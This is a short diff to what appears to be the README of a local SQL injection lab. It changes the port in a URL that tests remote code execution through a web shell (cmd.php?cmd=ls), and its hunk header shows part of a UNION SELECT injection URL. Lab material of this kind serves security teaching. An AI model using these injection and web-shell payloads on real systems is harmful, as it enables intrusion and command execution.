@@ -86,7 +86,7 @@ http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1%20UNION%20SELECT%201,
 
 After that you can check remote code execution with:
 
-http://127.0.0.1:8781/cmd.php?cmd=ls
+http://127.0.0.1:8782/cmd.php?cmd=ls
 
 # Generic Attack
 
